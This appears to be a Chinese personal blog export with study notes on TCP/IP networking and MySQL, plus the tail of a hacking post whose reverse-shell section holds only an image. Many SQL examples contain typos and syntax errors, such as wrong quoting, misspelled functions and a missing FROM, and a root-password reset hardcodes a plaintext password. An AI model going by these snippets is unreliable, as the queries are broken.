<pre><code>## 原理同上</code></pre><h2 id="8、反弹shell"><a href="#8、反弹shell" class="headerlink" title="8、反弹shell"></a>8、反弹shell</h2><p><a href="https://imgchr.com/i/BFDrmd"><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/10/22/BFDrmd.md.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="BFDrmd.md.png"></a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>黑客技术</tag>
      </tags>
  </entry>
  <entry>
    <title>tcp/ip</title>
    <url>/2020/05/03/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h1><p><a href="http://blog.sina.com.cn/s/blog_52ddfea30100nssx.html">相关博客</a></p>
<h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><h3 id="以太网术语"><a href="#以太网术语" class="headerlink" title="以太网术语"></a>以太网术语</h3><p>以太网遵循一组控制其基本操作的简单规则。为了更好地理解这些规则，了解基本的以太网术语十分重要。 </p>
<ol>
<li>介质——以太网设备连接到一个公共介质上，该介质为电气信号的传输提供了一条路径。历史上一直使用同轴铜电缆作为传输介质，但是目前双绞线或光纤更为多见。 </li>
<li>网段——我们将单个共享介质称作一个以太网段。 </li>
<li>节点——连接到网段的设备称作站点或节点。 </li>
<li>帧——节点使用称作帧的简短消息进行通信，帧是大小不固定的信息块。 帧类似于人类语言中的句子。在中文里，我们构造句子时会有一些规则，例如每个句子必须包含主语和谓语。以太网协议也规定了用于构造帧的一组规则。对于帧的最大和最小长度有明确规定，而且帧中必须包含一组必需的信息段。例如，每个帧必须包括目标地址和源地址，它们分别指出了消息的接收方和发送方。通过地址可标识唯一的节点，就像通过姓名可找出某个人一样。任何两个以太网设备都不应具有相同的地址。<span id="more"></span>
####TCP/IP协议原理图及解释</li>
</ol>
<p><a href="http://s3.sinaimg.cn/middle/52ddfea3t998861108572&690">原理图链接</a></p>
<p><strong>应用层（FTP协议）:</strong></p>
<p>首先我们说说应用层，应用层就像在特定城市特定大厦特定房间内的某一个用户，应用层之间的通讯就像两个不同用户之间发送的信，这个信是点对点的，从一个用户（某一主机内特定应用程序）到另外一个特定用户（另一主机内特定应用程序）。一个主机（大厦）内可能有很多应用程序（客户），我们如何区分它们呢，实际生活中我们用房间号，在电脑内部区分不同应用程序我们用端口号。</p>
<p><strong>传输层(TCP):</strong></p>
<p>用户写好了信，需要给信套上信封，并且写好发件人所在大厦，和收件人所在大厦，实际生活中的大厦完全可以类比为我们的计算机和服务器。传输层（TCP）就是在两个不同主机之间传输信息的协议。</p>
<p><strong>网络层(IP):</strong></p>
<p>邮件准备好了，他首先会被送到本城市的快递公司，并且被打包，包裹上会写着源是重庆快递公司，目的是沈阳快递公司，但是重庆快递公司发现它不能直接发货到沈阳，需要通过北京快递公司进行中转。所以虽然目的是沈阳，但是他首先把这个包裹发给了北京。某个城市的快递公司就像IP协议，要抵达目的IP，需要查询路由表，如果发现目的地址不是直连就需要找下一跳。通过了解快递公司的工作，我们了解到IP协议是逐跳工作的。每一跳（路由器）根据目的IP地址查询下一跳，并且最终转发到目的地。</p>
<p><strong>链路层（以太网）:</strong></p>
<p>重庆快递公司已经知道他需要把包裹发给北京快递公司了，现在他就把包裹送到重庆火车站，搭上去往北京的火车，然后在北京火车站卸货。然后送到北京快递公司，北京快递公司再判断下一跳为沈阳快递公司，并且选择适当的传输方式，例如:汽车，最后通过这种传输方式送到目的地沈阳快递公司。链路层协议就像包裹的运输方式，我们可以选择以太网（火车），也可以选择令牌环（汽车）。并且链路层协议是逐介质的，从一个网卡（重庆火车站）到另外一个网卡（北京火车站）。<br>所以你会发现一个数据包从源到目的，IP地址总是不变的（源是重庆快递公司，目的是沈阳快递公司），但是链路层协议却在不断变化，第一跳源是重庆火车站，目的是北京火车站，第二跳源是北京汽车站，目的是沈阳汽车站。</p>
<ul>
<li><p>知名端口号一般都低于1024，客户端端口号是临时的</p>
</li>
<li><p>TCP对数据进行封装，并对数据的安全进行保障，IP对被TCP封装后的数据进行传输</p>
</li>
<li><p>UDP对数据进行包装时不会对数据是否丢包进行保障，丢包时不返回检查，例如聊天信息的传输</p>
</li>
<li><p>以太网的类型：0800  IP数据  （记）</p>
<p>​                         0806  ARP请求/应答   (记)</p>
<p>​                         8035  RARP请求/应答</p>
</li>
<li><p>以太网的MTU最大值是1500，当数据大小大于出口的MTU时，会进行切片，并可进行多次切片处理</p>
</li>
</ul>
<h2 id="关于IP首部"><a href="#关于IP首部" class="headerlink" title="关于IP首部"></a>关于IP首部</h2><p><a href="https://blog.csdn.net/Wu000999/article/details/88617237">IP首部链接</a></p>
<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20190317101238221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1d1MDAwOTk5,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p>
<ul>
<li>详情点击上方链接（太难了。。。）</li>
</ul>
<h2 id="MAC-地址与-IP-地址区别"><a href="#MAC-地址与-IP-地址区别" class="headerlink" title="MAC 地址与 IP 地址区别"></a>MAC 地址与 IP 地址区别</h2><ul>
<li>IP 地址和 MAC 地址相同点是它们都唯一，不同的特点主要有：</li>
</ul>
<ol>
<li>对于网络上的某一设备，如一台计算机或一台路由器，其 IP 地址是基于网络拓扑设计出的，同一台设备或计算机上，改动 IP 地址是很容易的（但必须唯一），而 MAC 则是生产厂商烧录好的，一般不能改动。我们可以根据需要给一台主机指定任意的 IP 地址，如我们可以给局域网上的某台计算机分配 IP 地址为 192.168.0.112 ，也可以将它改成 192.168.0.200。而任一网络设备（如网卡，路由器）一旦生产出来以后，其 MAC 地址不可由本地连接内的配置进行修改。如果一个计算机的网卡坏了，在更换网卡之后，该计算机的 MAC 地址就变了。</li>
<li>长度不同。IP 地址为 32 位，MAC 地址为 48 位。</li>
<li>分配依据不同。IP 地址的分配是基于网络拓扑，MAC 地址的分配是基于制造商。</li>
<li>寻址协议层不同。IP 地址应用于 OSI 第三层，即网络层，而 MAC 地址应用在 OSI 第二层，即数据链路层。 数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过 MAC 地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP 根据目的 IP 地址，找到中间节点的 MAC 地址，通过中间节点传送，从而最终到达目的网络）。</li>
<li><strong>MAC地址其实是可以修改的，网上能搜到</strong></li>
</ol>
<h3 id="数据传输时"><a href="#数据传输时" class="headerlink" title="数据传输时"></a>数据传输时</h3><ul>
<li>IP视为标记，原IP和目的IP再数据传输的过程中是不变的</li>
<li>MAC视为步骤，每次经过网关时，IP和原MAC不变，但是目的MAC却会改变</li>
</ul>
<h5 id="基于TCP的应用层协议："><a href="#基于TCP的应用层协议：" class="headerlink" title="基于TCP的应用层协议："></a>基于TCP的应用层协议：</h5><ul>
<li>HTTP：80</li>
<li>HTTPS：443</li>
<li>FTP：20/21</li>
<li>SSH：22</li>
<li>TELNET：23</li>
<li>SMTP/POP：25/110</li>
</ul>
<h3 id="通过tcp包中flags的值来判断tcp的状态"><a href="#通过tcp包中flags的值来判断tcp的状态" class="headerlink" title="通过tcp包中flags的值来判断tcp的状态"></a>通过tcp包中flags的值来判断tcp的状态</h3><p>在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.</p>
<p>其中，对于我们日常的分析有用的就是前面的五个字段。<br>它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。</p>
<p>其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。</p>
<p>PSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。<br>TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。</p>
<p>TCP三次握手：<br>TCP(Transmission Control Protocol)传输控制协议<br>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：</p>
<p>位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p>
<p>三次握手详解如下：<br>一个虚拟连接的建立是通过三次握手来实现的</p>
<p>(B) –&gt; [SYN] –&gt; (A)<br>假如服务器A和客户机B通讯. 当A要和B通信时，B首先向A发一个SYN (Synchronize) 标记的包，告诉A请求建立连接.<br>注意: 一个 SYN包就是仅SYN标记设为1的TCP包(参见TCP包头Resources). 认识到这点很重要，只有当A受到B发来的SYN包，才可建立连接，除此之外别无他法。因此，如果你的防火墙丢弃所有的发往外网接口的SYN包，那么你将不能让外部任何主机主动建立连接。<br>(B) &lt;– [SYN /ACK] &lt;–(A)<br>接着，A收到后会发一个对SYN包的确认包(SYN/ACK)回去，表示对第一个SYN包的确认，并继续握手操作.<br>注意: SYN/ACK包是仅SYN 和 ACK 标记为1的包.<br>(B) –&gt; [ACK] –&gt; (A)<br>B收到SYN/ACK 包,B发一个确认包(ACK)，通知A连接已建立。至此，三次握手完成，一个TCP连接完成<br>Note: ACK包就是仅ACK 标记设为1的TCP包. 需要注意的是当三此握手完成、连接建立以后，TCP连接的每个包都会设置ACK位<br>握手阶段：<br>序号 方向 seq ack</p>
<ol>
<li>A-&gt;B 10000 0</li>
<li>B-&gt;A 20000 10000+1=10001</li>
<li>A-&gt;B 10001 20000+1=20001<br>解释：<br>1：A向B发起连接请求，以一个随机数初始化A的seq,这里假设为10000，此时ACK＝0<br>2：B收到A的连接请求后，也以一个随机数初始化B的seq，这里假设为20000，意思是：你的请求我已收到，我这方的数据流就从这个数开始。B的ACK是A的seq加1，即10000＋1＝10001<br>3：A收到B的回复后，它的seq是它的上个请求的seq加1，即10000＋1＝10001，意思也是：你的回复我收到了，我这方的数据流就从这个数开始。A此时的ACK是B的seq加1，即20000+1=20001<br>数据传输阶段：<br>序号　　方向　　　　　　seq ack size<br>23 A-&gt;B 40000 70000 1514<br>24 B-&gt;A 70000 40000+1514-54=41460 54<br>25 A-&gt;B 41460 70000+54-54=70000 1514<br>26 B-&gt;A 70000 41460+1514-54=42920 54<br>解释：<br>23:B接收到A发来的seq=40000,ack=70000,size=1514的数据包<br>24:于是B向A也发一个数据包，告诉B，你的上个包我收到了。B的seq就以它收到的数据包的ACK填充，ACK是它收到的数据包的SEQ加上数据包的大小(不包括以太网协议头，IP头，TCP头)，以证实B发过来的数据全收到了。<br>25:A在收到B发过来的ack为41460的数据包时，一看到41460，正好是它的上个数据包的seq加上包的大小，就明白，上次发送的数据包已安全到达。于是它再发一个数据包给B。这个正在发送的数据包的seq也以它收到的数据包的ACK填充，ACK就以它收到的数据包的seq(70000)加上包的size(54)填充,即ack=70000+54-54(全是头长，没数据项)。<br>其实在握手和结束时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度.如果从以太网包返回来计算所加的长度,就嫌走弯路了.<br>另外,如果对方没有数据过来,则自处己的确认号不变,序列号为上次的序列号加上本次应用层数据发送长度.</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="https://iknow-pic.cdn.bcebos.com/b219ebc4b74543a99d881d8113178a82b80114ef?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p>
<p><a href="https://blog.csdn.net/hushengqiang/article/details/44180557">原文链接</a></p>
<h3 id="TCP-IP的四元组、五元组、七元组"><a href="#TCP-IP的四元组、五元组、七元组" class="headerlink" title="TCP/IP的四元组、五元组、七元组"></a>TCP/IP的四元组、五元组、七元组</h3><ol>
<li><p>四元组是：源IP地址、目的IP地址、源端口、目的端口</p>
</li>
<li><p>五元组是:   源IP地址、目的IP地址、协议号、源端口、目的端口</p>
</li>
<li><p>七元组是:    源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引</p>
</li>
</ol>
]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库</title>
    <url>/2021/03/24/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h1 id="数据库的学习（一）"><a href="#数据库的学习（一）" class="headerlink" title="数据库的学习（一）"></a>数据库的学习（一）</h1><ul>
<li><a href="https://www.bilibili.com/video/BV12b411K7Zu/?p=28">相关视频链接</a></li>
</ul>
<h2 id="数据库及其概念"><a href="#数据库及其概念" class="headerlink" title="数据库及其概念"></a>数据库及其概念</h2><ul>
<li>DB 数据库</li>
<li>DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB</li>
<li>SQL  管理数据库的语言，几乎被所有的DBMS支持</li>
<li>DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令</li>
</ul>
<span id="more"></span>

<h3 id="数据库管理的特点"><a href="#数据库管理的特点" class="headerlink" title="数据库管理的特点"></a>数据库管理的特点</h3><ol>
<li>先将数据放到 “一张表” 中， 在将表放到仓库中</li>
<li>一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己</li>
<li>数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”</li>
<li>表是由列组成，也称为字段，相当与python中的  “属性”</li>
<li>表是按行储存的，每一行相当与python中的  ”对象“</li>
</ol>
<ul>
<li>端口号port 3306</li>
</ul>
<h3 id="Linux-系统-Mysql-相关事项"><a href="#Linux-系统-Mysql-相关事项" class="headerlink" title="Linux 系统 Mysql 相关事项"></a>Linux 系统 Mysql 相关事项</h3><ul>
<li><p>检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql –version</p>
</li>
<li><p>systemctl start mysql.service 启动  或者 service mysql start<br>systemctl stop mysql.service 停止  或者 service mysql stop<br>systemctl restart mysql.service 重启</p>
</li>
<li><p>检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld<br><a href="https://blog.csdn.net/qq_31083947/article/details/90248565">相关检查操作链接</a></p>
</li>
</ul>
<h3 id="数据库常用命令"><a href="#数据库常用命令" class="headerlink" title="数据库常用命令"></a>数据库常用命令</h3><ol>
<li>进入管理系统时时查看有那些数据库</li>
</ol>
<pre><code>show databases;</code></pre><ol start="2">
<li>进入库</li>
</ol>
<pre><code>use 库的名称;</code></pre><ol start="3">
<li>查看库里有哪些表</li>
</ol>
<pre><code>show tables;</code></pre><ol start="4">
<li>从现在所在的库中查看别的库中存有的表</li>
</ol>
<pre><code>show tables from 库的名称;</code></pre><ol start="5">
<li>查看现在在哪个库</li>
</ol>
<pre><code>select database();</code></pre><ol start="6">
<li>查看表的内容</li>
</ol>
<pre><code>desc 表的名称;</code></pre><ol start="7">
<li>创建表</li>
</ol>
<pre><code>create table 表名（
    列名 列类型，
    列名 列类型，
    ...
)</code></pre><h3 id="SQL语法规范"><a href="#SQL语法规范" class="headerlink" title="SQL语法规范"></a>SQL语法规范</h3><ol>
<li>不区分大小写，但建议关键字大写，表名，列名小写</li>
<li>每行命令u最好用分号结尾</li>
<li>每行命令根据需要，可以进行缩进，或换行</li>
<li>SQL语法中索引从1开始</li>
<li>注释 </li>
</ol>
<ul>
<li>单行注释：#注释文字</li>
<li>单行注释：– 注释文字（注意横杠后面有空格）</li>
<li>多行注释：/× 注释文字 ×/</li>
</ul>
<h3 id="使用-DBMS-图形化界面以及命令行登录时出现错误解决"><a href="#使用-DBMS-图形化界面以及命令行登录时出现错误解决" class="headerlink" title="使用 DBMS 图形化界面以及命令行登录时出现错误解决"></a>使用 DBMS 图形化界面以及命令行登录时出现错误解决</h3><ul>
<li><a href="https://www.cnblogs.com/leolztang/p/5094930.html">原文链接</a></li>
</ul>
<pre><code>~$ mysql -u root -p
Enter password: 
ERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39;</code></pre><ul>
<li>解决</li>
</ul>
<pre><code># 强制登录
sudo mysql

select user, plugin from mysql.user;

update mysql.user set authentication_string=PASSWORD(&#39;hero1314&#39;), plugin=&#39;mysql_native_password&#39; where user=&#39;root&#39;;

flush privileges;

sudo service mysql restart</code></pre><h2 id="数据库语言的学习"><a href="#数据库语言的学习" class="headerlink" title="数据库语言的学习"></a>数据库语言的学习</h2><h3 id="DQL语言的学习"><a href="#DQL语言的学习" class="headerlink" title="DQL语言的学习"></a>DQL语言的学习</h3><h4 id="1、基础查询"><a href="#1、基础查询" class="headerlink" title="1、基础查询"></a>1、基础查询</h4><ul>
<li>语法</li>
</ul>
<pre><code>select 查询列表 from 表名;</code></pre><ul>
<li>特点：</li>
</ul>
<ol>
<li>查询列表可以是：表中的字段，常量值，表达式，函数</li>
<li>查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已</li>
</ol>
<ul>
<li>查询字段</li>
</ul>
<pre><code>select 字段一，字段二 from 表格;    //字段之间用逗号隔开
select * from 表格;  // 查询所有字段</code></pre><ul>
<li><p>着重号 `  （1的旁边的那个），用来标识字段</p>
</li>
<li><p>查询常量值：select ‘ 字符或字符串 ’ ;</p>
</li>
<li><p>起别名</p>
<p>​    别名有空格时，应用空格将别名括起来</p>
<p>​    注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 </p>
</li>
</ul>
<pre><code>select 字段值 as 别名;  // as可以省略</code></pre><ul>
<li>去重：在被查询的字段之前加上关键字 distinct</li>
<li>+ 号的作用</li>
</ul>
<pre><code>select 100+90; // 俩个操作数都为数值型，则做加法运算
# 结果：190
select &#39;100&#39;+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算
# 结果：190
select null+10; //若有一个方为null，则结果肯定为null</code></pre><ul>
<li>ifnull( ) 函数</li>
</ul>
<pre><code>select IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值</code></pre><h4 id="2、条件查询"><a href="#2、条件查询" class="headerlink" title="2、条件查询"></a>2、条件查询</h4><ul>
<li>语法：</li>
</ul>
<pre><code>select 查询列表 from 表名 where 筛选条件;</code></pre><ul>
<li>分类：</li>
</ul>
<ol>
<li><p>按表达条件筛选：</p>
<p>​        逻辑运算符：&gt; , &lt;, =, &lt;&gt; , &lt;=, &gt;=</p>
<p>​        注意：&lt;&gt;为不等于的意思</p>
</li>
<li><p>按逻辑表达式筛选：</p>
<p>​        &amp;&amp;， ||， ！</p>
<p>​        and，or，not   // SQL推荐使用</p>
</li>
<li><p>模糊查询</p>
<p>​        like, between and, in, is null</p>
<ul>
<li>between and 等价与  &gt;=  and &lt;=</li>
</ul>
<p>模糊查询通常与通配符一起使用  (in 不支持)</p>
<ul>
<li><p>常见通配符：% 匹配任意一个或零个</p>
<p>​                     _  (下划线) 匹配任意一个</p>
<ul>
<li>支持对通配符进行转义</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>select 字段 from 表名 where like &#39;_$_&#39; escape &#39;$&#39;; //使用$符号对下划线进行转义</code></pre><pre><code>select × from 表名 where like %a%;</code></pre><ol start="4">
<li>安全等于  &lt;=&gt; : 可以判断显示NULL</li>
</ol>
<h4 id="3、排序查询"><a href="#3、排序查询" class="headerlink" title="3、排序查询"></a>3、排序查询</h4><ul>
<li>语法：</li>
</ul>
<pre><code>select 字段
from 表
where 筛选条件
order by 排序列表 asc|desc   //不写关键字，默认是asc
# asc 从低到高 （升序）
# desc 从高到底 （降序）</code></pre><ul>
<li>支持别名排序， 运算表达式排序</li>
<li>支持对多个列表进行先后排序查询，列表间用逗号隔开</li>
<li>排序语句一般是放在查询语句的最后面</li>
</ul>
<h4 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h4><ul>
<li>类似python中的方法</li>
<li>函数可以嵌套使用</li>
<li>分类：</li>
</ul>
<ol>
<li>单行函数：concat, length, ifnull等</li>
<li>分组函数：<ul>
<li>功能：做统计使用，又称为统计函数，聚合函数，组函数</li>
</ul>
</li>
</ol>
<h5 id="单行函数"><a href="#单行函数" class="headerlink" title="单行函数"></a>单行函数</h5><h6 id="一、字符函数"><a href="#一、字符函数" class="headerlink" title="一、字符函数"></a>一、字符函数</h6><ol>
<li>length </li>
</ol>
<pre><code>select length(&#39;str&#39;);</code></pre><ol start="2">
<li>concat ( ) 拼接函数</li>
</ol>
<pre><code>concat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开
# 若str中有值为NULL，则查询的所有值为NULL</code></pre><ol start="3">
<li><p>upper( ), lower( ) :改变大小写</p>
</li>
<li><p>substr( ) ：截取字符函数</p>
</li>
</ol>
<pre><code>select substr(&#39;今天买了个大白菜&#39;， 6);
结果: 大白菜
select substr(&#39;今天买了个大白菜&#39;， 3, 4);
结果: 买了</code></pre><ol start="5">
<li>instr( ) :返回字串第一个字符的索引，没有则返回0</li>
</ol>
<pre><code>select instr(&#39;今天买了个大白菜&#39;， &#39;大白菜&#39;);
结果：6</code></pre><ol start="6">
<li>trim( ) :去掉字段中的空格或指定字符</li>
</ol>
<pre><code>select trim(&#39;烂的&#39; from &#39;今天买了个烂的大白菜&#39;);
结果：今天买了个大白菜</code></pre><ol start="7">
<li><p>lpad( ): 左填充指定长度的字符，</p>
<p>rpad( ): 右填充指定长度的字符</p>
</li>
</ol>
<pre><code>select ipad(&#39;大白菜&#39;, 6, &#39;*&#39;);
结果：×××大白菜
select rpad(&#39;大白菜&#39;, 6, &#39;*&#39;);
结果：大白菜×××</code></pre><ol start="8">
<li>replace 替换</li>
</ol>
<pre><code>select replace(&#39;今天买了个大白菜&#39;, &#39;大白菜&#39;, &#39;胡萝卜&#39;);
结果：今天买了个胡萝卜</code></pre><h6 id="二、数学函数"><a href="#二、数学函数" class="headerlink" title="二、数学函数"></a>二、数学函数</h6><ol>
<li>round( ) : 四舍五入函数</li>
</ol>
<pre><code>select round(1.1236);  //默认保留整数部分
结果：1
select round(1.1236, 3);  //可指定保留小数部分
结果：1.124</code></pre><ol start="2">
<li>ceil( ): 向上取整，返回 &gt;= 该函数的最小整数</li>
<li>floor( ): 向下取整，返回  &lt;= 该函数的最大整数</li>
</ol>
<pre><code>select floor(-9.99);
结果：-10</code></pre><ol start="4">
<li>truncate 截断函数，截断小数点后指定的位数</li>
</ol>
<pre><code>select truncate(1.123, 2);
结果：1.12</code></pre><ol start="5">
<li>mod( ): 取模（取余）函数</li>
</ol>
<pre><code>select mod(10,3);
结果：1</code></pre><h6 id="三、日期函数"><a href="#三、日期函数" class="headerlink" title="三、日期函数"></a>三、日期函数</h6><ol>
<li>now( ) 返回当前系统日期+时间</li>
<li>curdate( ) 返回当前系统日期，不返回时间</li>
<li>curtime( ) 返回当前时间，不返回日期</li>
<li>str_to_date( ) 将日期格式的字符转换成指定格式的日期</li>
<li>date_format( ) 将日期转换成字符</li>
</ol>
<ul>
<li>更多日期函数请上网搜索</li>
</ul>
<h6 id="四、流程控制函数"><a href="#四、流程控制函数" class="headerlink" title="四、流程控制函数"></a>四、流程控制函数</h6><ol>
<li>if( ) :该函数起到的作用类似与python或C语言中的else if( )函数</li>
<li>case( )： </li>
</ol>
<pre><code>case 要判断的字段或表达式    // 选择函数——判断并选择显示一个
when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 
when 常量2 then 要显示的值2或语句2;
...
else 默认显示的值或语句
end</code></pre><pre><code>case
when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 
when 常量2 then 要显示的值2或语句2;
...
else 默认显示的值或语句
end</code></pre><h6 id="五、其它函数"><a href="#五、其它函数" class="headerlink" title="五、其它函数"></a>五、其它函数</h6><ul>
<li>其他函数太多，用时上网搜</li>
</ul>
<h5 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h5><ul>
<li>功能：用作统计使用，又称为聚合函数或统计函数或组函数</li>
<li>分类：sum 求和， avg 平均值， max， min， count 计算个数</li>
<li>忽略 NULL值</li>
<li>可以与distinct( )去重函数或其它函数搭配使用</li>
<li>count( )详细介绍</li>
</ul>
<pre><code>select count(*) from 表单;  //统计总行数</code></pre><ul>
<li>和分组函数一同查询的字段要求是group by后的字段</li>
</ul>
<h4 id="4、分组查询"><a href="#4、分组查询" class="headerlink" title="4、分组查询"></a>4、分组查询</h4><ol>
<li>语法：</li>
</ol>
<pre><code>select 分组函数，列（要求出现在group by的后面）
from 表
[where 筛选条件]
group by 分组的列表;
[order by 子句]

// 查询列表必须特殊，要求是分组函数和group by 后出现的字段</code></pre><ul>
<li>简单的分组查询</li>
</ul>
<ol>
<li>实例一：查询每个工种的最高工资</li>
</ol>
<pre><code>select max(salary), job_id
from employees
group by job_id;</code></pre><ol start="3">
<li>实例二：查询每个位置上的部门个数</li>
</ol>
<pre><code>select count(*), location_id
from departments
group by lacation_id;</code></pre><ul>
<li>添加筛选条件的分组查询</li>
</ul>
<ol start="4">
<li>实例三：查询邮箱中包含a字符的，每个部门的平均工资</li>
</ol>
<pre><code>select avg(salsry), department_id
from employees
where email &#39;%a%&#39;
group by department_id;</code></pre><ol start="5">
<li>实例四：查询有奖金的每个领导手下员工的最高工资</li>
</ol>
<pre><code>select max(salary), manager_id
from employees
where commission_pct is ont null
group by manager_id;</code></pre><ul>
<li>添加复杂筛选条件的分组查询</li>
<li>分组后进行条件筛选的查询</li>
</ul>
<ol start="6">
<li>实例五：查询哪个部门的员工个数&gt;2</li>
</ol>
<pre><code>select count(*), depatment_id
from employees
group by department_id
having count(*)&gt;2;   //用查询的结果再进行筛选时用having</code></pre><h4 id="5、连接查询【-优先学习99语法-】"><a href="#5、连接查询【-优先学习99语法-】" class="headerlink" title="5、连接查询【 优先学习99语法 】"></a>5、连接查询【 优先学习99语法 】</h4><ol>
<li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p>
</li>
<li><p>笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行</p>
<ol>
<li>发生原因：没有有效的链接条件</li>
<li>如何避免：添加有效的连接条件</li>
</ol>
</li>
<li><p>按功能分类：</p>
<ul>
<li><p>内连接：等值连接</p>
<p>​               非等值连接</p>
<p>​               自连接</p>
</li>
<li><p>外连接：左外连接</p>
<p>​               右外连接</p>
<p>​               全外连接</p>
</li>
<li><p>交叉连接</p>
</li>
</ul>
</li>
</ol>
<h5 id="SQL92语法"><a href="#SQL92语法" class="headerlink" title="SQL92语法"></a>SQL92语法</h5><p>(1) 等值查询</p>
<ul>
<li>查询员工名和对应的部门名</li>
</ul>
<pre><code>select last_name, department_name
from employees, departments
where employees.&#39;department_id=departments.&#39;department_id&#39;;</code></pre><ul>
<li>多条件筛选连接查询<ul>
<li>查询有奖金的员工名，部门名</li>
</ul>
</li>
</ul>
<pre><code>select last_name, department_name, commission_pct
from emplloees e, departments d
where e.&#39;department_id&#39;=d.&#39;department_id&#39;
and e.&#39;commission_pct&#39; is not null;</code></pre><p>(2) 非等值链接</p>
<ul>
<li>在等值链接的基础上将条件改为非等值就行</li>
</ul>
<p>(3) 自链接</p>
<ul>
<li><p>自己链接自己</p>
</li>
<li><p>实例:查询查询一张表中员工名和上级的名称</p>
</li>
</ul>
<pre><code>select e.employee_id, e.last_name, m.employee_id, m.last_name
from employees e, employees m
where e.&#39;manager_id&#39;=m.&#39;employee_id&#39;;</code></pre><h5 id="SQL99语法"><a href="#SQL99语法" class="headerlink" title="SQL99语法"></a>SQL99语法</h5><ul>
<li><p>语法： select 查询列表</p>
<p>​            from 表1 别名</p>
<pre><code>        [连接类型]  join 表2 别名</code></pre><p>​            on 连接条件</p>
<p>​            where 筛选条件</p>
<p>​            group by 分组</p>
<p>​            having 筛选条件</p>
<p>​            order by 排序条件</p>
</li>
</ul>
<h6 id="内链接"><a href="#内链接" class="headerlink" title="内链接"></a>内链接</h6><ul>
<li>语法：</li>
</ul>
<pre><code>select 查询列表
from 表1 别名
inner join 表2 别名
on 连接条件；</code></pre><ul>
<li>分类：</li>
</ul>
<pre><code>内链接：inner
外链接
    左外：left【outer】  //括号中outer可以省去
    右外：right 【outer】
    全外：full 【outer
交叉连接：cross</code></pre><ol>
<li>等值查询（内连接）</li>
</ol>
<pre><code>案例1 查询员工名、部门名
select last_name, department_name
from employees e
inner join departments d
on e.&#39;department_id&#39; = d.&#39;department_id&#39;;</code></pre><ol start="2">
<li>非等值连接(内链接)</li>
</ol>
<pre><code>案例1：查询员工的工资级别
select salary, grdae_level
from employees e
join job_grades g
on e.&#39;salary&#39; between g.&#39;lowest_sal&#39; and &#39;highest_sal&#39;;</code></pre><ol start="3">
<li>自连接（内连接）</li>
</ol>
<pre><code>查询员工的名字，上级的名字,包含字符k的
select e.last_name, m.last_name
join employees m
on e.&#39;manager_id&#39; = m.&#39;employee_id&#39;
where e.&#39;last_name&#39; like &#39;%k%&#39;;</code></pre><h6 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h6><ul>
<li>应用场景，一个表格有，一个表格没有</li>
